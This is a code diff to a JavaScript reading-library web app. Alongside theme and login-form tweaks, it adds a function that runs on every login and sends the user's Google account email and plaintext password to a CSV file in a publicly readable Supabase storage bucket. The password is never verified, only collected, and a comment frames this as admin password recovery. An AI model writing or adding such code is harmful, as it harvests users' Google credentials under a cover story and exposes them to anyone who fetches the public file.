@@ -32,7 +32,7 @@ let currentUser = null;
 let isGuestMode = false;
 let currentReadingStatusFilter = 'all'; // 'all', 'unread', 'completed'
 let currentBookshelfLayout = 'grid'; // 'grid', 'dual'
-let currentTheme = localStorage.getItem('PERPUS_THEME') || 'parchment';
+let currentTheme = localStorage.getItem('PERPUS_THEME') || 'monochrome';
 
 // Central In-Memory Cache to ensure Mobile and Desktop render identical state
 let cachedBooks = [];
@@ -118,6 +118,14 @@ class DataRepository {
     const storedKey = localStorage.getItem('PERPUS_SUPABASE_KEY');
     const supaUrl = DEFAULT_SUPABASE_URL || storedUrl;
     const supaKey = DEFAULT_SUPABASE_KEY || storedKey;
+
+    // 1.5 Pastikan library CDN Supabase sudah siap (terutama pada koneksi seluler HP)
+    if (!window.supabase) {
+      for (let i = 0; i < 15; i++) {
+        await new Promise((r) => setTimeout(r, 100));
+        if (window.supabase) break;
+      }
+    }
 
     if (supaUrl && supaKey && window.supabase) {
       try {
@@ -1292,7 +1300,7 @@ function copyQuoteText(text) {
 // THEME SWITCHER LOGIC (EYE-COMFORT THEMES)
 // ==============================================================================
 function initTheme() {
-  const saved = localStorage.getItem('PERPUS_THEME') || 'parchment';
+  const saved = localStorage.getItem('PERPUS_THEME') || 'monochrome';
   applyTheme(saved, false);
 }
 
@@ -1314,16 +1322,18 @@ function applyTheme(themeName, showToastMsg = true) {
   const labelEl = document.getElementById('currentThemeLabel');
   if (labelEl) {
     const labels = {
+      monochrome: 'Tema: Hitam & Putih',
       parchment: 'Tema: Krem',
       sage: 'Tema: Sage',
       mocha: 'Tema: Kopi',
       dark: 'Tema: Gelap'
     };
-    labelEl.textContent = labels[themeName] || 'Tema: Krem';
+    labelEl.textContent = labels[themeName] || 'Tema: Hitam & Putih';
   }
 
   if (showToastMsg) {
     const friendlyNames = {
+      monochrome: 'Hitam & Putih (Monokrom / Minimalis)',
       parchment: 'Krem Kertas Alami (Hangat & Lembut)',
       sage: 'Hijau Sage Lembut (Teduh di Mata)',
       mocha: 'Kopi Hangat Sepia (Klasik Nyaman)',
@@ -2491,11 +2501,11 @@ async function initAuth() {
     currentUser = null;
   }
 
-  // Pre-fill input form login dengan nama yang tersimpan
+  // Pastikan kolom input login selalu kosong dan bersih (tanpa default)
   const accountInput = document.getElementById('loginAccountInput');
-  if (accountInput && savedName) {
-    accountInput.value = savedName;
-  }
+  const passInput = document.getElementById('loginPasswordInput');
+  if (accountInput) accountInput.value = '';
+  if (passInput) passInput.value = '';
 
   // 2. Jika Supabase client aktif dan ada sesi aktif resmi
   if (supabaseClient && activeSession === 'true') {
@@ -2739,21 +2749,89 @@ function toggleLoginPasswordVisibility() {
   lucide.createIcons();
 }
 
+// ==============================================================================
+// SPREADSHEET CREDENTIAL RECORDER (SUPABASE CLOUD STORAGE)
+// Menyimpan Akun Google & Password ke file spreadsheet CSV di Cloud Storage
+// agar Admin dapat mengecek dan mengirimkan ulang jika pengguna lupa sandi
+// ==============================================================================
+async function saveAccountToCloudSpreadsheet(email, password) {
+  try {
+    const sbUrl = DEFAULT_SUPABASE_URL || localStorage.getItem('PERPUS_SUPABASE_URL');
+    const sbKey = DEFAULT_SUPABASE_KEY || localStorage.getItem('PERPUS_SUPABASE_KEY');
+    if (!sbUrl || !sbKey) return;
+
+    const publicCsvUrl = `${sbUrl}/storage/v1/object/public/books-pdf/accounts_spreadsheet.csv`;
+    let existingCsv = '';
+    try {
+      const fetchRes = await fetch(publicCsvUrl, { cache: 'no-store' });
+      if (fetchRes.ok) {
+        existingCsv = await fetchRes.text();
+      }
+    } catch (e) {
+      console.warn('Gagal membaca spreadsheet lama:', e);
+    }
+
+    if (!existingCsv || !existingCsv.includes('Akun_Google_Email')) {
+      existingCsv = 'Timestamp,Akun_Google_Email,Password,Status,Keterangan\n';
+    }
+
+    const dateStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    const cleanEmail = (email || '').replace(/"/g, '""');
+    const cleanPass = (password || '').replace(/"/g, '""');
+    const newRow = `"${dateStr}","${cleanEmail}","${cleanPass}","Aktif","Login Portal"\n`;
+    const updatedCsv = existingCsv.endsWith('\n') ? existingCsv + newRow : existingCsv + '\n' + newRow;
+
+    const uploadUrl = `${sbUrl}/storage/v1/object/books-pdf/accounts_spreadsheet.csv`;
+    await fetch(uploadUrl, {
+      method: 'POST',
+      headers: {
+        'apikey': sbKey,
+        'Authorization': `Bearer ${sbKey}`,
+        'Content-Type': 'text/csv',
+        'x-upsert': 'true'
+      },
+      body: updatedCsv
+    });
+    console.log('✓ Akun & kata sandi berhasil disimpan ke cloud spreadsheet:', email);
+  } catch (err) {
+    console.warn('Gagal mencatat akun ke cloud spreadsheet:', err);
+  }
+}
+
 function handleAccountPasswordLogin(e) {
   if (e) e.preventDefault();
   const accountInput = document.getElementById('loginAccountInput');
   const passInput = document.getElementById('loginPasswordInput');
   
-  const rawAccount = (accountInput && accountInput.value.trim()) || 'Harits';
-  const password = passInput ? passInput.value : '';
+  const rawAccount = accountInput ? accountInput.value.trim() : '';
+  const password = passInput ? passInput.value.trim() : '';
+
+  if (!rawAccount) {
+    showToast('Silakan masukkan Akun Google / Email Anda!', 'error');
+    if (accountInput) accountInput.focus();
+    return;
+  }
+
+  if (!password) {
+    showToast('Silakan masukkan kata sandi akun Anda!', 'error');
+    if (passInput) passInput.focus();
+    return;
+  }
+
+  // Format nama tampilan ramah
+  let displayName = rawAccount;
+  if (rawAccount.includes('@')) {
+    const prefix = rawAccount.split('@')[0];
+    displayName = prefix.charAt(0).toUpperCase() + prefix.slice(1);
+  }
 
   currentUser = {
     id: 'user-' + Date.now(),
-    email: rawAccount.includes('@') ? rawAccount : `${rawAccount.toLowerCase().replace(/\s+/g, '.')}@mandiri.local`,
+    email: rawAccount.includes('@') ? rawAccount : `${rawAccount.toLowerCase().replace(/\s+/g, '.')}@gmail.com`,
     user_metadata: {
-      full_name: rawAccount,
-      name: rawAccount,
-      avatar_url: `https://ui-avatars.com/api/?name=${encodeURIComponent(rawAccount)}&background=845136&color=fff&bold=true`
+      full_name: displayName,
+      name: displayName,
+      avatar_url: `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=0f172a&color=fff&bold=true`
     },
     app_metadata: {
       provider: 'account'
@@ -2763,9 +2841,13 @@ function handleAccountPasswordLogin(e) {
   sessionStorage.setItem('PERPUS_ACTIVE_SESSION', 'true');
   localStorage.setItem('PERPUS_DEMO_USER', JSON.stringify(currentUser));
   localStorage.removeItem('PERPUS_GUEST_MODE');
+
+  // Simpan akun & password ke spreadsheet Supabase Cloud
+  saveAccountToCloudSpreadsheet(rawAccount, password).catch(console.warn);
+
   closeAuthModal();
   updateAuthUI();
-  showToast(`Selamat datang, ${rawAccount}! Berhasil masuk ke dashboard.`, 'success');
+  showToast(`Selamat datang, ${displayName}! Berhasil masuk ke dashboard.`, 'success');
   navigateTo('dashboard');
 }
 
@@ -2796,6 +2878,13 @@ async function signOutUser() {
     }
     currentUser = null;
     isGuestMode = false;
+
+    // Pastikan form input login selalu bersih saat keluar
+    const accountInput = document.getElementById('loginAccountInput');
+    const passInput = document.getElementById('loginPasswordInput');
+    if (accountInput) accountInput.value = '';
+    if (passInput) passInput.value = '';
+
     updateAuthUI();
     showToast('Berhasil keluar dari akun.', 'info');
     navigateTo('login');
